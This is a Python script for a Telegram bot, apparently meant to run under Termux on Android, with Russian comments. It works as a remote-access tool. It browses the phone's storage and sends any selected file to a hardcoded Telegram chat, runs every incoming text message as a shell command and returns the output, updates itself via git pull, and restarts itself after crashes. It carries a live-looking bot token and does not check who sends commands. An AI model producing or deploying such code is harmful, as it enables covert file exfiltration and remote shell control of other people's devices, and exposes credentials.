import os, sys, subprocess, telebot
from telebot import types

# ТВОИ НОВЫЕ ДАННЫЕ
TOKEN = "8384800383:AAEhTQb6SPmkmuqancHOnggADxgrOcDSMM0"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)

def get_file_markup(path="/sdcard"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    try:
        # Используем ls -aF для отображения скрытых файлов и типов
        items = subprocess.getoutput(f"ls -p '{path}'").splitlines()
        
        if path != "/sdcard" and path != "/sdcard/":
            parent = os.path.dirname(path.rstrip('/'))
            markup.add(types.InlineKeyboardButton("⬅️ НАЗАД", callback_data=f"dir_{parent}"))
        
        count = 0
        for item in items:
            if count > 20: break # Лимит кнопок
            full_path = os.path.join(path, item).replace('//', '/')
            if item.endswith('/'):
                markup.add(types.InlineKeyboardButton(f"📁 {item}", callback_data=f"dir_{full_path}"))
            else:
                markup.add(types.InlineKeyboardButton(f"📄 {item}", callback_data=f"get_{full_path}"))
            count += 1
    except:
        markup.add(types.InlineKeyboardButton("❌ Ошибка чтения директории", callback_data="ignore"))
    return markup

@bot.message_handler(commands=['start', 'files'])
def show_files(m):
    # Запрос прав на память при первом запуске
    if not os.path.exists("/sdcard/DCIM"):
        os.system("termux-setup-storage")
    bot.send_message(CHAT_ID, "📂 **Файловый менеджер активен**\nВыберите папку:", 
                     reply_markup=get_file_markup("/sdcard"), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data.startswith("dir_"):
        path = call.data.replace("dir_", "")
        bot.edit_message_text(f"📂 **Путь:** `{path}`", CHAT_ID, call.message.message_id, 
                              reply_markup=get_file_markup(path), parse_mode="Markdown")
    elif call.data.startswith("get_"):
        path = call.data.replace("get_", "")
        try:
            with open(path, 'rb') as f:
                bot.send_document(CHAT_ID, f)
        except:
            bot.send_message(CHAT_ID, "❌ Файл недоступен для чтения")

@bot.message_handler(content_types=['text'])
def terminal(m):
    t = m.text.lower()
    if t == "update":
        bot.send_message(CHAT_ID, "🔄 Тяну код с гитхаба...")
        subprocess.run(["git", "pull"])
        bot.send_message(CHAT_ID, "✅ Обновлено. Рестарт...")
        os.execv(sys.executable, ['python'] + sys.argv)
    elif t == "restart":
        bot.send_message(CHAT_ID, "🔄 Рестарт...")
        os.execv(sys.executable, ['python'] + sys.argv)
    else:
        # Выполнение любой команды терминала
        res = subprocess.getoutput(m.text)
        if not res: res = "✅ Выполнено"
        bot.send_message(CHAT_ID, f"💻 **Терминал:**\n`{res[:4000]}`", parse_mode="Markdown")

# Запуск
if __name__ == "__main__":
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        # Авторестарт при падении
        os.execv(sys.executable, ['python'] + sys.argv)
